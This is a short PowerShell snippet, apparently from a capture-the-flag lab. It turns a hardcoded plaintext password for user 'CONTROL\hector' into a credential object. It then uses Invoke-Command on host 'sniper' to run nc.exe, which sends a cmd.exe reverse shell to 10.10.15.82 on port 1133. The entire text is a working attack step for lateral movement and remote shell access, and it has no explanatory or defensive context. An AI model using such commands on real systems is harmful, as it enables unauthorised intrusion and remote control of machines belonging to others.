$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('CONTROL\hector', $pass)
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 10.10.15.82 1133 }
